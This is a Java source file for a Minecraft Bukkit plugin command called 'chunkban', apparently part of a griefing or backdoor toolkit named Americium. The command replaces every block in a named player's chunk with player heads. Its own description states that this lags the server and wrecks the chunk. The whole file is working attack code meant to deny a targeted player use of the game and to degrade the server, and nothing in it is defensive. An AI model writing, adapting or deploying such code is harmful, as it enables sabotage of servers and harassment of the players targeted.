package cc.americium.command.commands;

import cc.americium.Colors;
import cc.americium.Utilities;
import cc.americium.command.Command;
import cc.americium.command.Context;
import cc.americium.command.Sender;
import org.bukkit.Bukkit;
import org.bukkit.Chunk;
import org.bukkit.Location;
import org.bukkit.Material;
import org.bukkit.block.Block;
import org.bukkit.entity.Player;

public class Chunkban implements Command {
    @Override
    public String[] getCommands() {
        return new String[]{"chunkban"};
    }

    @Override
    public String getDescription() {
        return "Set the chunk a player is in to heads. WILL LAG THE SERVER + FUCK UP THE CHUNK.";
    }

    @Override
    public void execute(Player executor, Sender sender, Context context) {
        String[] args = context.getArgs();
        if (args.length == 0) {
            sender.sendMessage(Colors.Prefix + Colors.Failure + "chunkban <player>");
            return;
        }

        Player found = Bukkit.getPlayer(args[0]);
        if (found == null) {
            sender.sendMessage(Colors.Prefix + Colors.Failure + "That player was not found!");
            return;
        }

        Bukkit.getScheduler().scheduleSyncDelayedTask(context.getZ_(), () -> {
            Chunk c = found.getLocation().getChunk();

            try {
                int amount = 0;

                int X = c.getX() * 16;
                int Z = c.getZ() * 16;

                Location lastBlock = null;

                for (int x = 0; x < 16; x++) {
                    for (int z = 0; z < 16; z++) {
                        for (int y = 0; y < 256; y++) {
                            Block b = c.getWorld().getBlockAt(X + x, y, Z + z).getLocation().getBlock();
                            b.setType(Material.PLAYER_HEAD);

                            amount++;
                            lastBlock = new Location(c.getWorld(), X + x, y, Z + z);
                        }
                    }
                }

                sender.sendMessage(Colors.Prefix + Colors.Success + "Successfully attempted to chunkban " + found.getName() + " by setting " + amount + " blocks to head.");
                sender.sendMessage(Colors.Caution + "Last block set at " + Utilities.locationToString(lastBlock) + ".");
            } catch (Exception e) {
                sender.sendMessage(Colors.Prefix + Colors.Failure + e.getMessage());
            }
        });
    }
}
